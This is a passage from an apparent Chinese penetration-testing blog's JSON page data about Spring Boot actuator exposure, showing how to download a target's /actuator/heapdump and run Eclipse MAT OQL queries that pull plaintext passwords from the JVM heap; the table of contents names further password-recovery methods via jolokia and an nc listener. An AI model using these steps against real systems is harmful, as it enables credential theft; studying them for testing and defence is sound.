stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>下载的 heapdump 文件大小通常在 50M—500M 之间，有时候也可能会大于 2G</p></blockquote>\n<p><code>GET</code> 请求目标的 <code>/heapdump</code> 或 <code>/actuator/heapdump</code> 接口，下载应用实时的 JVM 堆信息</p>\n<h2 id=\"步骤三：-使用-MAT-获得-jvm-heap-中的密码明文\"><a href=\"#步骤三：-使用-MAT-获得-jvm-heap-中的密码明文\" class=\"headerlink\" title=\"步骤三： 使用 MAT 获得 jvm heap 中的密码明文\"></a>步骤三： 使用 MAT 获得 jvm heap 中的密码明文</h2><p>参考 <a href=\"https://landgrey.me/blog/16/\">文章</a> 方法，使用 <a href=\"https://www.eclipse.org/mat/downloads.php\">Eclipse Memory Analyzer</a> 工具的 <strong>OQL</strong> 语句</p>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains(\"password\"))\n\n或\n\nselect * from java.util.LinkedHashMap$Entry x WHERE (toString(x.key).contains(\"password\"))<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>辅助用 “<strong>password</strong>“ 等关键词快速过滤分析，获得密码等相关敏感信息的明文。</p>\n","feature":true,"text":"一、路由地址及接口调用详情泄露 开发人员没有意识到地址泄漏会导致安全隐患或者开发环境切换为线上生产环境时，相关人员没有更改配置文件，忘记切换环境配置等 直接访问以下两个 swagger 相关路由，验证漏洞是否存在： /v2/api-docs /swagger-ui.html 其他...","link":"","photos":[],"count_time":{"symbolsCount":"7.4k","symbolsTime":"7 mins."},"categories":[{"name":"渗透测试","slug":"渗透测试","count":9,"path":"api/categories/渗透测试.json"}],"tags":[{"name":"渗透测试","slug":"渗透测试","count":9,"path":"api/tags/渗透测试.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E4%B8%80%E3%80%81%E8%B7%AF%E7%94%B1%E5%9C%B0%E5%9D%80%E5%8F%8A%E6%8E%A5%E5%8F%A3%E8%B0%83%E7%94%A8%E8%AF%A6%E6%83%85%E6%B3%84%E9%9C%B2\"><span class=\"toc-text\">一、路由地址及接口调用详情泄露</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E4%BA%8C%E3%80%81%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E8%80%8C%E6%9A%B4%E9%9C%B2%E7%9A%84%E8%B7%AF%E7%94%B1\"><span class=\"toc-text\">二、配置不当而暴露的路由</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E4%B8%89%E3%80%81%E8%8E%B7%E5%8F%96%E8%A2%AB%E6%98%9F%E5%8F%B7%E8%84%B1%E6%95%8F%E7%9A%84%E5%AF%86%E7%A0%81%E7%9A%84%E6%98%8E%E6%96%87%EF%BC%88%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%89\"><span class=\"toc-text\">三、获取被星号脱敏的密码的明文（方法一）</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%AD%A5%E9%AA%A4%E4%B8%80%EF%BC%9A-%E6%89%BE%E5%88%B0%E6%83%B3%E8%A6%81%E8%8E%B7%E5%8F%96%E7%9A%84%E5%B1%9E%E6%80%A7%E5%90%8D\"><span class=\"toc-text\">步骤一： 找到想要获取的属性名</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%AD%A5%E9%AA%A4%E4%BA%8C%EF%BC%9A-jolokia-%E8%B0%83%E7%94%A8%E7%9B%B8%E5%85%B3-Mbean-%E8%8E%B7%E5%8F%96%E6%98%8E%E6%96%87\"><span class=\"toc-text\">步骤二： jolokia 调用相关 Mbean 获取明文</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%9B%9B%E3%80%81%E8%8E%B7%E5%8F%96%E8%A2%AB%E6%98%9F%E5%8F%B7%E8%84%B1%E6%95%8F%E7%9A%84%E5%AF%86%E7%A0%81%E7%9A%84%E6%98%8E%E6%96%87%EF%BC%88%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%89\"><span class=\"toc-text\">四、获取被星号脱敏的密码的明文（方法二）</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%AD%A5%E9%AA%A4%E4%B8%80%EF%BC%9A-%E6%89%BE%E5%88%B0%E6%83%B3%E8%A6%81%E8%8E%B7%E5%8F%96%E7%9A%84%E5%B1%9E%E6%80%A7%E5%90%8D-1\"><span class=\"toc-text\">步骤一： 找到想要获取的属性名</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%AD%A5%E9%AA%A4%E4%BA%8C%EF%BC%9A-%E4%BD%BF%E7%94%A8-nc-%E7%9B%91%E5%90%AC-HTTP-%E8%AF%B7%E6%B1%82\"><span class=\"toc-text\">步骤二： 使用 nc 监听 HTTP 请求</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%AD%A5%E9%AA%A4%E4%B8%89%EF%BC%9A-%E8%AE%BE%E7%BD%AE-eureka-client-serviceUrl-defaultZone-%E5%B1%9E%E6%80%A7\"><span class=\"toc-text\">步骤三： 设置 eureka.client.serviceUrl.defaultZone 属性</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%AD%A5%E9%AA%A4%E5%9B%9B%EF%BC%9A-%E5%88%B7%E6%96%B0%E9%85%8D%E7%BD%AE\"><span class=\"toc-text\">步骤四： 刷新配置</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%AD%A5%E9%AA%A4%E4%BA%94%EF%BC%9A-%E8%A7%A3%E7%A0%81%E5%B1%9E%E6%80%A7%E5%80%BC\"><span class=\"toc-text\">步骤五： 解码属性值</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E4%BA%94%E3%80%81%E8%8E%B7%E5%8F%96%E8%A2%AB%E6%98%9F%E5%8F%B7%E8%84%B1%E6%95%8F%E7%9A%84%E5%AF%86%E7%A0%81%E7%9A%84%E6%98%8E%E6%96%87%EF%BC%88%E6%96%B9%E6%B3%95%E4%B8%89%EF%BC%89\"><span class=\"toc-text\">五、获取被星号脱敏的密码的明文（方法三）</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%AD%A5%E9%AA%A4%E4%B8%80%EF%BC%9A-%E6%89%BE%E5%88%B0%E6%83%B3%E8%A6%81%E8%8E%B7%E5%8F%96%E7%9A%84%E5%B1%9E%E6%80%A7%E5%90%8D-2\"><span class=\"toc-text\">步骤一： 找到想要获取的属性名</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%AD%A5%E9%AA%A4%E4%BA%8C%EF%BC%9A-%E4%BD%BF%E7%94%A8-nc-%E7%9B%91%E5%90%AC-HTTP-%E8%AF%B7%E6%B1%82-1\"><span class=\"toc-text\">步骤二： 使用 nc 监听 HTTP 请求</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%AD%A5%E9%AA%A4%E4%B8%89%EF%BC%9A-%E8%A7%A6%E5%8F%91%E5%AF%B9%E5%A4%96-http-%E8%AF%B7%E6%B1%82\"><span class=\"toc-text\">步骤三： 触发对外 http 请求</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%AD%A5%E9%AA%A4%E5%9B%9B%EF%BC%9A-%E5%88%B7%E6%96%B0%E9%85%8D%E7%BD%AE-1\"><span class=\"toc-text\">步骤四： 刷新配置</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%85%AD%E3%80%81%E8%8E%B7%E5%8F%96%E8%A2%AB%E6%98%9F%E5%8F%B7%E8%84%B1%E6%95%8F%E7%9A%84%E5%AF%86%E7%A0%81%E7%9A%84%E6%98%8E%E6%96%87%EF%BC%88%E6%96%B9%E6%B3%95%E5%9B%9B%EF%BC%89\"><span class=\"toc-text\">六、获取被星号脱敏的密码的明文（方法四）</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%AD%A5%E9%AA%A4%E4%B8%80%EF%BC%9A-%E6%89%BE%E5%88%B0%E6%83%B3%E8%A6%81%E8%8E%B7%E5%8F%96%E7%9A%84%E5%B1%9E%E6%80%A7%E5%90%8D-3\"><span class=\"toc-text\">步骤一： 找到想要获取的属性名</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%AD%A5%E9%AA%A4%E4%BA%8C%EF%BC%9A-%E4%B8%8B%E8%BD%BD-jvm-heap-%E4%BF%A1%E6%81%AF\"><span class=\"toc-text\">步骤二： 下载 jvm heap 信息</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%AD%A5%E9%AA%A4%E4%B8%89%EF%BC%9A-%E4%BD%BF%E7%94%A8-MAT-%E8%8E%B7%E5%BE%97-jvm-heap-%E4%B8%AD%E7%9A%84%E5%AF%86%E7%A0%81%E6%98%8E%E6%96%87\"><span class=\"toc-text\">步骤三： 使用 MAT 获得 jvm heap 中的密码明文</span></a></li></ol></li></ol>","author":{"name":"街溜子小王","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"默默学习的街溜子","socials":{"github":"https://github.com/ztohacker","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"Spring Security OAuth2 远程命令执行漏洞（CVE-2016-4977） SpEL表达式 RCE","uid":"6567db906d267d45710c8c967afd05c5","slug":"Spring Security OAuth2 远程命令执行漏洞（CVE-2016-4977） SpEL表达式 RCE","date":"2021-10-13T12:56:13.931Z","updated":"2021-10-13T12:57:58.643Z","comments":true,"path":"api/articles/Spring Security OAuth2 远程命令执行漏洞（CVE-2016-4977） SpEL表达式 RCE.json","keywords":null,"cover":[],"text":"一、漏洞原理 spring boot 处理参数值出错，流程进入 org.springframework.util.PropertyPlaceholderHelper 类中 此时 URL 中的参数值会用 parseStringValue 方法进行递归解析 其中 $&#123;&#1...","link":"","photos":[],"count_time":{"symbolsCount":"2.1k","symbolsTime":"2 mins."},"categories":[{"name":"渗透测试","slug":"渗透测试","count":9,"path":"api/categories/渗透测试.json"}],"tags":[{"name":"渗透测试","slug":"渗透测试","count":9,"path":"api/tags/渗透测试.json"}],"author":{"name":"街溜子小王","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"默默学习的街溜子","socials":{"github":"https://github.com/ztohacker","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"Springboot之actuator配置不当引发漏洞","uid":"3126e077d4a90cee169e013b88d8de20","slug":"Springboot之actuator配置不当引发漏洞","date":"2021-10-13T12:56:13.927Z","updated":"2021-10-13T12:58:50.556Z","comments":true,"path":"api/articles/Springboot之actuator配置不当引发漏洞.json","keywords":null,"cover":[],"text":"一、actuator介绍Actuator 是 springboot 提供的用来对应用系统进行自省和监控的功能模块，借助于 Actuator 开发者可以很方便地对应用系统某些监控指标进行查看、统计等。在 Actuator 启用的情况下，如果没有做好相关权限控制，非法用户可通过访问默...","link":"","photos":[],"count_time":{"symbolsCount":"2.7k","symbolsTime":"2 mins."},"categories":[{"name":"渗透测试","slug":"渗透测试","count":9,"path":"api/categories/渗透测试.json"}],"tags":[{"name":"渗透测试","slug":"渗透测试","count":9,"path":"api/tags/渗透测试.json"}],"author":{"name":"街溜子小王","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"默默学习的街溜子","socials":{"github":"https://github.com/ztohacker","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}